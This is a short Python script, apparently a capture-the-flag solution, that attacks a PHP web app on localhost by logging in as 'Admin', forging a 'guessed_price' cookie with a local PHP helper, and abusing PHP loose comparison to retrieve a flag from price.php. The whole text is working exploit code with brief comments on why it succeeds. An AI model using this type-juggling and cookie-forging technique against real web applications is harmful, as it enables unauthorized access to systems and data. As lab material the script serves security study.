import requests
import subprocess

# Login to get admin session
URL = "http://localhost"

s = requests.Session()

data = {
    "username": "Admin", # case insensitive MySQL
    "password": "admin"
}

s.post(URL, data=data) # Obtain PHPSESSID cookie

# Obtain cookie logic
proc = subprocess.Popen(f"php cookie.php", shell=True, stdout=subprocess.PIPE)
guessed_price_cookie = proc.stdout.read().decode() # get correct cookie with price value set to boolean `true`

final_cookies = {
    "PHPSESSID": s.cookies['PHPSESSID'],
    "guessed_price": guessed_price_cookie
}

flag = s.get(URL + "/price.php", cookies=final_cookies) # Condition passes due to loose comparison `==` instead of `===`
print(flag.text)
